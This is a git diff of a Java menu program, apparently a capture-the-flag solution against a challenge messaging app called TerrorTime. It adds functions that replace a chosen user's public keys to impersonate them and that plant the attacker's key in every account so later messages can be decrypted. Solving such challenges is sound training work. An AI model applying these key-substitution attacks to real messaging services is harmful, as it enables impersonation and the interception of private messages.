@@ -1,6 +1,7 @@
 package terrortimesol;
 
 import java.util.Collection;
+import java.util.InputMismatchException;
 import java.util.LinkedList;
 import java.util.Scanner;
 
@@ -61,14 +62,98 @@ public class Main {
 		System.out.println("\n[*] Print the last encrypted message");
 		System.out.print("[*] Please enter the username: ");
 		String username = input.nextLine();
-		input.close();
 		XmppClient xmppClient = new XmppClient(username);
 		xmppClient.printTheLastEncryptedMessage();
 	}
 
+	public static void masquerade() {
+		Scanner input = new Scanner(System.in);
+		System.out.println("\n[*] Who do you want to masquerade?");
+		System.out.print("[*] Please enter the username: ");
+		String username = input.nextLine();
+		System.out.print("[*] Please enter your public key filename: ");
+		String pubKeyFile = input.nextLine();
+		XmppClient xmppClient = new XmppClient(username);
+		String originalPubKeys = xmppClient.replacePublicKeysWith(pubKeyFile, true);
+		if (originalPubKeys != "") {
+			xmppClient.disconnect();
+			System.out.println("[+] You have been masqueraded as " + username);
+			System.out.println("[*] " + username + " CANNOT see your spoofed messages");
+			System.out
+					.println("[*] Please log in as " + username + " on the android emulator and send spoofed messages");
+			String choice = "y";
+			do {
+				System.out.print("[*] Stop masquerading [Y/n]?");
+				choice = input.nextLine();
+			} while (choice == "n");
+			xmppClient = new XmppClient(username);
+			if (xmppClient.replacePublicKeysWith(originalPubKeys, false) != "") {
+				System.out.println("[+] Masquerading is stop.");
+			}
+		} else {
+			System.out.println("[-] Cannot masquerade");
+		}
+	}
+
+	public static void addPublicKeyToAllAccounts() throws InterruptedException {
+		Scanner input = new Scanner(System.in);
+		System.out.print("[*] Please enter your public key filename: ");
+		String pubKeyFile = input.nextLine();
+		LinkedList<String> usernames = Main.getAllAccounts();
+		for (String username: usernames) {
+			XmppClient xmppClient = new XmppClient(username);
+			xmppClient.addPublicKey(pubKeyFile);
+			xmppClient.disconnect();
+		}
+		System.out.println("[+] You public key has been added to all Terrortime account.");
+	}
+
+	public static int menu() {
+		int selection = 0;
+		Scanner input = new Scanner(System.in);
+
+		System.out.println("\n\n[*] Menu");
+		System.out.println("    1 - Print all accounts");
+		System.out.println("    2 - Print the last encrypted message");
+		System.out.println("    3 - Masquerade");
+		System.out.println("    4 - Add your public key to all account for future decryption");
+		System.out.println("    0 - Exit");
+		System.out.print("[*] Please enter your choices: ");
+
+		do {
+			try {
+				selection = input.nextInt();
+			} catch (InputMismatchException e) {
+				System.out.println("[-] Invalid choice.");
+				System.out.print("\n[*] Please choose again: ");
+				input.nextLine();
+				selection = -1;
+			}
+		} while (selection < 0 || selection > 4);
+		return selection;
+	}
+
 	public static void main(String[] args) throws InterruptedException {
-		Main.getAllAccounts();
-		Main.printTheLastEncryptedMessage();
+		int selection = 0;
+		do {
+			selection = Main.menu();
+			switch (selection) {
+			case 1:
+				Main.getAllAccounts();
+				break;
+			case 2:
+				Main.printTheLastEncryptedMessage();
+				break;
+			case 3:
+				Main.masquerade();
+				break;
+			case 4:
+				Main.addPublicKeyToAllAccounts();
+				break;
+			case 0:
+				selection = -1;
+			}
+		} while (selection != 0);
 	}
 
 }
